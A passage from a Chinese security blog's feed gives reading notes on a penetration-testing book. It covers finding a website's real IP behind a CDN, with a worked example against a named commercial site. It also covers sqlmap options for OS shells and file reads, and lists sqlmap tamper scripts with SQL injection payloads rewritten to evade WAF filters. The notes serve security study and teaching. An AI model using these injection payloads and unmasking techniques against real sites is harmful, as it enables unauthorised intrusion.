href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-源码分析&quot;&gt;&lt;a href=&quot;#0x00-源码分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 源码分析&quot;&gt;&lt;/a&gt;0x00 源码分析&lt;/h2&gt;&lt;p&gt;在/index.php     56行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="复现" scheme="http://mang0.me/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>《Web安全攻防-渗透测试实战指南》读书笔记</title>
    <link href="http://mang0.me/archives/924987ad/"/>
    <id>http://mang0.me/archives/924987ad/</id>
    <published>2018-10-26T14:05:27.000Z</published>
    <updated>2018-11-02T13:52:15.994Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=45429&amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank" rel="external">i春秋</a>，转载请注明来源</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录书中一些不甚熟悉以及其他扩展的技巧tips，欢迎纠错和交流。</p><h2 id="第1章-渗透测试之信息收集"><a href="#第1章-渗透测试之信息收集" class="headerlink" title="第1章 渗透测试之信息收集"></a><strong>第1章 渗透测试之信息收集</strong></h2><p>进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能地收集目标的信息。所谓“知己知彼，百战不殆”，我们越是了解测试目标，测试的工作就越是容易。本章主要介绍了域名及子域名信息收集﹑查找真实IP﹑CMS指纹识别﹑目标网站真实IP﹑常用端口的信息收集等。</p><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>nslookup</p><p>whois</p><p>天眼查</p><h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p>谷歌语法</p><p>看burpsuite的response包</p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="https://dnsdumpster.com/、在线dns侦查、" target="_blank" rel="external">https://dnsdumpster.com/、在线dns侦查、</a></p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>工具：御剑web指纹识别，what web，webrobo，椰树，轻量web指纹识别，</p><p>在线网站：<a href="http://tools.bugscaner.com/" target="_blank" rel="external">Bugscaner</a>、<a href="http://www.yunsee.cn/" target="_blank" rel="external">云悉指纹</a>、<a href="https://www.whatweb.net/" target="_blank" rel="external">whatweb</a></p><h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h3><p>不存在cdn：<a href="http://www.ip138.com/" target="_blank" rel="external">http://www.ip138.com/</a></p><p>cdn：先用<a href="https://www.17ce.com/多地区ping" target="_blank" rel="external">https://www.17ce.com/多地区ping</a></p><p>绕过方式：</p><ul><li><p>内部邮箱源，ping邮件服务器的域名</p></li><li><p>扫描测试文件 phpinfo</p></li><li><p>分站域名： 主站挂cdn，分站未挂，二级域名突破口</p></li><li><p>国外访问：国内的cdn只针对国内用户访问加速，国外不一定 通过国外在线代理网站：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a></p></li><li><p>查询域名解析记录。<a href="https://www.netcraft.com/" target="_blank" rel="external">https://www.netcraft.com/</a></p></li><li><p>网站有app，burpsuit抓包</p></li><li><p>绕过CloudFlare CDN查找真实IP。CloudFlare Watch</p></li><li><p>用 Zmap 扫全网</p><p>  『我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me』（其中xiaix.me是需要寻找真实IP的域名）。说到这个，我就想起了shodan，zoomeye。虽然他们都很强大地能够搜索到全球的IP banner信息，http的banner信息，但是却不能搜索网页代码。</p><p>  有没有一种搜索可以搜索网页标题、内容的方法，这样，我就能找到哪写服务器上运行的网站是与我要找的一致，就能找出真实的服务器IP。在圈子里混，朋友推荐一个新的IOT搜索引擎，跟前面提到的两个相似，叫fofa，WWW.FOFA.SO。这个东西优点是支持HTML源代码检索。</p><p>  举例：找到www.5173.com的真实IP</p><p>  使用ping命令，返回信息有『49k6959vz6ea10u8.alicloudsec.com (218.11.3.155)』，这及时试用了某CDN服务的信号。</p><blockquote><p><strong>ping www.5173.com</strong><br>正在 Ping 49k6959vz6ea10u8.alicloudsec.com [218.11.3.155] 具有 32 字节的数据:<br>来自 218.11.3.155 的回复: 字节=32 时间=34ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=36ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=32ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=31ms TTL=33</p><p>218.11.3.155 的 Ping 统计信息:</p><pre><code>数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</code></pre><p>往返行程的估计时间(以毫秒为单位):</p><pre><code>最短 = 31ms，最长 = 36ms，平均 = 33ms</code></pre></blockquote><p>  访问www.5173.com，源代码内显示标题有很特别的内容『网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com』，包含有根域名5173.com，这种title是非常特殊的，用来检索，就能找到WWW.5173.COM的真实IP</p><p>  查看www.5173.com的标题</p><p>  将这个标题内容作为关键词搜索，使用语法『title=”网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com”』</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252056_937.png" alt=""></p><p>  在FOFA上搜索到3个网站包含指定标题</p><p>  在FOFA上搜索到www.5173.com的IP</p><p>  最后，访问<a href="http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155" target="_blank" rel="external">http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155</a>“</p><p>  搜索这个IP上的全部服务和网站，显示全是5173.com结尾的域名，基本确认这是真实ip，且是5173.com的主要网站服务器。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252101_958.png" alt=""></p><p>  查看『218.11.3.155』上的所有网站和服务</p></li></ul><h3 id="收集敏感目录"><a href="#收集敏感目录" class="headerlink" title="收集敏感目录"></a>收集敏感目录</h3><p>spinder.py、<a href="http://www.webscan.cc/、dirbuster" target="_blank" rel="external">http://www.webscan.cc/、dirbuster</a></p><h2 id="第2章-搭建漏洞环境及实战"><a href="#第2章-搭建漏洞环境及实战" class="headerlink" title="第2章 搭建漏洞环境及实战"></a><strong>第2章 搭建漏洞环境及实战</strong></h2><p>白帽子在目标对象不知情或者没有得到授权的情况下发起的渗透攻击是非法行为，所以我们通常会搭建一个有漏洞的Web应用程序，以此来练习各种各样的安全渗透技术。本章主要介绍了Linux系统下的LANMP﹑Windows系统下的WAMP应用环境的搭建，DVWA漏洞平台﹑SQL注入平台﹑XSS测试平台等常用渗透测试漏洞练习平台的安装配置及实战。</p><h2 id="第3章-常用工具"><a href="#第3章-常用工具" class="headerlink" title="第3章 常用工具"></a><strong>第3章 常用工具</strong></h2><p>“工欲善其事，必先利其器”，在日常的渗透测试中，借助一些工具，白帽子可以更高效地执行安全测试，这能极大地提高工作的效率和成功率。本章详细介绍了黑客常用的三大神器SQLMap﹑Burp Suite﹑Nmap的安装﹑入门和实战利用，实为“居家旅行”﹑渗透测试之必备工具。</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell –os-shell 运行任意系统操作命令</p><p>sqlmap -u “url” –file-read “C:/example.exe” -v 1 从数据可服务器中读取文件</p><p>–file-write –file-dest :上传文件到数据服务器中</p><p>–identify -waf 是否有安全防护 （waf/IDS/IPS）</p><p>sqlmap tamper：</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><blockquote><p>sqlmap.py XXXXX -tamper “模块名”</p></blockquote><h3 id="各个-tamper-的作用"><a href="#各个-tamper-的作用" class="headerlink" title="各个 tamper 的作用"></a>各个 tamper 的作用</h3><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote><p>return payload.replace(‘\’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>apostrophemask.py 用UTF-8全角字符替换单引号字符 ，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1  <strong>to</strong>     1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote><p>return payload.replace(‘\’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>     1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1    <strong>to</strong>    1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>    MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：<code>C:\Python\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B    <strong>to</strong>    1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B    <strong>to</strong>    1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em> from users where id = 1    <strong>to</strong>    union%09select </em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload </p><blockquote><p>select <em> from users    <em>*to</em></em>    %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p><blockquote><p>select <em> from users    <em>*to</em></em>    %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select <em> from users    <em>*to</em></em>    \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1    <strong>to</strong>    limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1)    <strong>to</strong>    mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote><p>retVal = re.sub(r”\b(\w+)(“, “\g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name)    <strong>to</strong>    union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2)    <strong>to</strong>    concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote><p>retVal = re.sub(r”\s<em>=\s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em> from users where id=1    <strong>to</strong>    select </em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote><p>return payload.replace(“‘“, “\’”).replace(‘“‘, ‘\”‘)</p></blockquote><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    1\‘ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b    <strong>to</strong>    1 and greatest(a,b+1)=a</p></blockquote><p>ALL</p><h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2    <strong>to</strong>    /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote><p>return re.sub(r”[^\w]”, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43;</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2)    <strong>to</strong>    if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “\g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables    <strong>to</strong>    select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT    <strong>to</strong>    union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union         select       1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1    <strong>to</strong>    select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em> from users    <strong>to</strong>    %s%e%l%e%c%t </em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+    <strong>to</strong>    UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1    <strong>to</strong>    1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote><p>retVal = “%s%ssp<em>password” % (payload, “– “ if not any(</em> if <em> in payload else None for </em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’  and 1=1–+    <strong>to</strong>    1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+    <strong>to</strong>    union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py：        union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2–+</p><p>space2morehash.py：union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong>    union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote><p>retVal = re.sub(r”(?i)\bAND\b”, “%26%26”, re.sub(r”(?i)\bOR\b”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1    <strong>to</strong>    1 %26%26 1=1</p><p>1 or 1=1    <strong>to</strong>    1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+    <strong>to</strong>    union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1    <strong>to</strong>    1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p><blockquote><p>union select    <strong>to</strong>    UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#    </p></blockquote><p><strong>to</strong>    </p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" 